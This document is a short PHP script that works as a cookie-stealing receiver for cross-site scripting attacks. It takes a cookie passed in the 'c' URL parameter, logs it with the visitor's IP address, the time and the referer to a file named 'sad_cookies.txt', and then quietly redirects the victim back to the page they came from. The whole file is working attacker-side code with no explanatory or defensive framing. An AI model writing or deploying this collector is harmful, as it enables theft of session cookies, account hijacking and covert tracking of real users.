<?php
	$cookie = $_GET['c'];
	$ip = $_SERVER["REMOTE_ADDR"];
	$date = date("j F, Y, g:i a");
	$referer = $_SERVER["HTTP_REFERER"];
	$out = 'Cookie: ' . $cookie . "\n";
	$out = $out . 'IP: ' . $ip . "\n";
	$out = $out . 'Date: ' . $date . "\n";
	$out = $out . 'Referer: ' . $referer  . "\n\n";
	$fp = fopen('sad_cookies.txt', 'a');
	fwrite($fp, $out);
	fclose($fp);
	header ("Location: " . $referer);